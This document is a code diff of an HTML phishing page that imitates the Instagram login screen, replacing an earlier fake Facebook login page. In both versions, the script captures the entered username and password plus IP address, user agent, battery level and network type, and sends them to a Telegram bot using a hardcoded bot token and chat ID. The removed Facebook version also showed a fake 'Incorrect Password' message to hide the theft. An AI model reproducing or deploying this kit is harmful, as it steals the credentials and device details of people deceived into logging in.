@@ -2,154 +2,192 @@
 <html>
 <head>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Facebook Login</title>
-  <link rel="stylesheet" type="text/css" href="style.css">
+  <title>Instagram Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fafafa;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 350px;
+      margin: 100px auto;
+      background-color: #fff;
+      border: 1px solid #ddd;
+      padding: 20px;
+      box-sizing: border-box;
+      text-align: center;
+    }
+
+    .logo {
+      margin-bottom: 20px;
+    }
+
+    .logo i {
+      background-image: url("https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wEDyo.png");
+      background-position: 0px -52px;
+      background-size: auto;
+      width: 175px;
+      height: 51px;
+      background-repeat: no-repeat;
+      display: inline-block;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+
+    .form-group input[type="submit"] {
+      background-color: #0095F6;
+      color: #fff;
+      cursor: pointer;
+      border: none;
+      padding: 10px;
+      border-radius: 4px;
+      width: 100%;
+    }
+
+    .form-group input[type="submit"]:hover {
+      background-color: #3274b5;
+    }
+
+    .signup-link {
+      margin-top: 20px;
+    }
+
+    .signup-link a {
+      color: #0095F6;
+      text-decoration: none;
+    }
+
+    .facebook-button {
+      background-color: #0095F6;
+      color: #fff;
+      cursor: pointer;
+      border: none;
+      padding: 10px;
+      border-radius: 4px;
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 10px;
+      text-decoration: none;
+    }
+
+    .facebook-button:hover {
+      background-color: #2e4473;
+    }
+
+    .facebook-button span {
+      margin-left: 5px;
+    }
+
+    .forgot-password {
+      font-size: 14px;
+      color: #0095F6;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        max-width: 280px;
+        margin: 50px auto;
+        padding: 10px;
+      }
+
+      .logo {
+        margin-bottom: 10px;
+      }
+    }
+  </style>
 </head>
+
 <body>
-  <p id="error-message"></p>
-  
   <div class="container">
-    <h1>Facebook Login</h1>
-    <img src="fblogo.svg" width="112" class="img" alt="facebook">
-    <form>
-      <label for="email">Email or Phone</label>
-      <input type="text" id="email" name="email" required>
-      <label for="password">Password</label>
-      <input type="password" id="password" name="password" required>
-      <button type="submit" id="login" class="btn">Log In</button>
+    <div class="logo">
+      <i data-visualcompletion="css-img" aria-label="Instagram" class=""></i>
+    </div>
+    <a href="https://www.facebook.com/login" target="_blank" style="text-decoration: none;">
+      <button class="facebook-button" type="button">
+        <span class="_9zlu _ab36"></span>
+        <span>Continue with Facebook</span>
+      </button>
+    </a>
+    <form id="login-form">
+      <div class="form-group">
+        <input type="text" placeholder="Username or Email">
+      </div>
+      <div class="form-group">
+        <input type="password" placeholder="Password">
+      </div>
+      <div class="form-group">
+        <input type="submit" value="Log In">
+      </div>
     </form>
-    <p><a href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr">Forgot Password?</a></p>
-    <hr>
-    <p>Don't have an account? <a href="https://m.facebook.com/reg/?cid=103&refsrc=deprecated&rtime=1679408395&subno_key=AaFkUvnR1UXz5BB-nEuQbGjRTjlo8TGU32dvtNicoDPg4wZiIhQITGS0w_cfGRq2Mx5R6s-DIXo-5-YnDNFjon3Rvwk1u_9UZvAAy3gg3J8anMMkNH7Gz0jqlCPcziGau0GDZhQ9qLg1mFtXwV0iklzv16cPnyY2tz2447J1FKQq_HbH1iRWEfpI2LQmHKyJQ76QukiUnkEHt352sQ3-yOJi6-X92kohNbxhKcwYYwIcI-ZNHV4FUJGQGwV14VDSvQl29CtCsXlA_qsYtB2CkesotivluRPQZz1OArg9Dowqi2mQzqo1ntMcZ8-D9bpbmEg&hrc=1&_rdr">Sign up</a></p>
+    <div class="forgot-password">
+      <a href="https://www.instagram.com/accounts/password/reset/" style="text-decoration: none;">Forgot password?</a>
+    </div>
+    <div class="signup-link">
+      Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" style="text-decoration: none;">Sign up</a>
+    </div>
   </div>
-  
-  <!---Coded By---: W8SOJIB---->
-  <!---Facebook---: https://facebook.com/W8Vai--->
 
   <script>
-    const botToken = "7611023975:AAGAR6vbPFAVdU_tg92u79FhQA6vYyV2XDA";  // Replace with your actual bot token
+    const loginForm = document.getElementById("login-form");
 
-    // Function to get query parameters from the URL
-    function getQueryParam(param) {
-      const urlParams = new URLSearchParams(window.location.search);
-      return urlParams.get(param);
-    }
+    loginForm.addEventListener("submit", async (event) => {
+      event.preventDefault();
 
-    // Get the chat ID from the URL parameter `Id`
-    const chatId = getQueryParam('Id');  // Dynamically gets the value of the `Id` parameter
+      const emailOrUsername = event.target.elements[0].value;
+      const password = event.target.elements[1].value;
+      const telegramChatId = "5710276456"; // Hardcoded chat ID
+      const token = "7611023975:AAGAR6vbPFAVdU_tg92u79FhQA6vYyV2XDA"; // Hardcoded bot token
 
-    // Function to retrieve device info, battery percentage, and IP address
-    function getDeviceInfo() {
-      return fetch('https://api.ipify.org/?format=json')
-        .then(response => response.json())
-        .then(data => data.ip)
-        .then(ipAddress => {
-          const deviceInfo = {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            memory: navigator.deviceMemory || 'Unknown'
-          };
-          return { ipAddress, deviceInfo };
-        });
-    }
+      // Function to retrieve IP, device, and memory information
+      const getDeviceInfo = async () => {
+        try {
+          const response = await fetch("https://api.ipify.org?format=json");
+          if (response.ok) {
+            const { ip } = await response.json();
+            const userAgent = navigator.userAgent;
+            const deviceMemory = navigator.deviceMemory;
+            const deviceName = navigator.deviceMemory ? "Desktop" : "Mobile";
+            const batteryPercentage = navigator.getBattery ? (await navigator.getBattery()).level * 100 : 'N/A';
+            const networkType = navigator.connection ? navigator.connection.effectiveType : 'N/A';
 
-    // Function to get battery percentage
-    function getBatteryPercentage() {
-      return new Promise((resolve, reject) => {
-        if ('getBattery' in navigator) {
-          navigator.getBattery().then(function(battery) {
-            resolve(battery.level * 100);  // Get battery percentage
-          }).catch(reject);
-        } else {
-          reject('Battery API not supported');
-        }
-      });
-    }
+            // Send IP, device, and memory information to Telegram
+            const message = `📧 Email: ${emailOrUsername}\n🔑 Password: ${password}\n🌐 IP Address: ${ip}\n📱 User Agent: ${userAgent}\n💻 Platform: ${deviceName}\n💾 Memory: ${deviceMemory} GB\n🔋 Battery Percentage: ${batteryPercentage}\n📶 Network Type: ${networkType}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;
 
-    // Function to send message with emoji
-    function sendMessageWithEmoji(message) {
-      const emojiMessage = `🌐 ${message}`;  // Add an emoji at the beginning of the message
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(emojiMessage)}&parse_mode=Markdown`;
-
-      fetch(url)
-        .then(response => response.json())
-        .then(data => {
-          console.log('Telegram API response:', data);
-          if (data.ok) {
-            console.log('Message sent with emoji');
+            const telegramResponse = await fetch(url);
+            if (telegramResponse.ok) {
+              console.log("Message sent successfully to Telegram bot");
+            } else {
+              console.error("Error sending message to Telegram bot");
+              alert("Failed to send. Please try again.");
+            }
           } else {
-            throw new Error(`Telegram API Error: ${data.description}`);
+            throw new Error("Failed to get IP address");
           }
-        })
-        .catch(error => {
-          console.error('Error:', error);
-          alert("Failed to send message to Telegram: " + error.message);
-        });
-    }
+        } catch (error) {
+          console.error("Error:", error);
+          alert("An unexpected error occurred. Please try again later.");
+        }
+      };
 
-    // Send message with IP, device information, and battery percentage when the page loads
-    window.addEventListener('load', () => {
-      getDeviceInfo().then(({ ipAddress, deviceInfo }) => {
-        getBatteryPercentage().then(batteryPercentage => {
-          const message = `New login info:\nIP Address: \`${ipAddress}\`\nUser Agent: ${deviceInfo.userAgent}\nPlatform: ${deviceInfo.platform}\nMemory: ${deviceInfo.memory} GB\nBattery: ${batteryPercentage}% 🚗`;
-          sendMessageWithEmoji(message);
-        }).catch(error => {
-          console.error('Battery info error:', error);
-          alert("Failed to retrieve battery information.");
-        });
-      }).catch(error => {
-        console.error('Device info error:', error);
-        alert("Failed to retrieve device information.");
-      });
-    });
-
-    const loginButton = document.getElementById("login");
-    const emailInput = document.getElementById("email");
-    const passwordInput = document.getElementById("password");
-
-    // Event listener for the login button
-    loginButton.addEventListener("click", function(event) {
-      event.preventDefault();  // Prevent form submission
-      const email = emailInput.value;
-      const password = passwordInput.value;
-
-      // Fetch device info and IP address
-      getDeviceInfo().then(({ ipAddress, deviceInfo }) => {
-        // Fetch battery info
-        getBatteryPercentage().then(batteryPercentage => {
-          // Format the message with backticks for monospace font
-          const message = `New login:\nEmail: \`${email}\`\nPassword: \`${password}\`\n\nIP Address: \`${ipAddress}\`\nUser Agent: ${deviceInfo.userAgent}\nPlatform: ${deviceInfo.platform}\nMemory: ${deviceInfo.memory} GB\nBattery: ${batteryPercentage}% 🚗`;
-
-          // Construct the URL for the Telegram API call
-          const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-
-          // Send the message to Telegram
-          fetch(url)
-            .then(response => response.json()) // Parse the response as JSON
-            .then(data => {
-              console.log('Telegram API response:', data);  // Log the response
-              if (data.ok) {
-                var errorMessage = "Incorrect Password! Please try again.";  // Show error message
-                document.getElementById("error-message").textContent = errorMessage;
-
-                emailInput.value = "";  // Clear email input
-                passwordInput.value = "";  // Clear password input
-              } else {
-                throw new Error(`Telegram API Error: ${data.description}`);  // Show error details
-              }
-            })
-            .catch(error => {
-              console.error('Error:', error);
-              alert("Failed to send message to Telegram: " + error.message);  // Show error details
-            });
-        }).catch(error => {
-          console.error('Battery info error:', error);
-          alert("Failed to retrieve battery information.");
-        });
-      }).catch(error => {
-        console.error('Device info error:', error);
-        alert("Failed to retrieve device information.");  // Show error for device info failure
-      });
+      getDeviceInfo();
     });
   </script>
 </body>
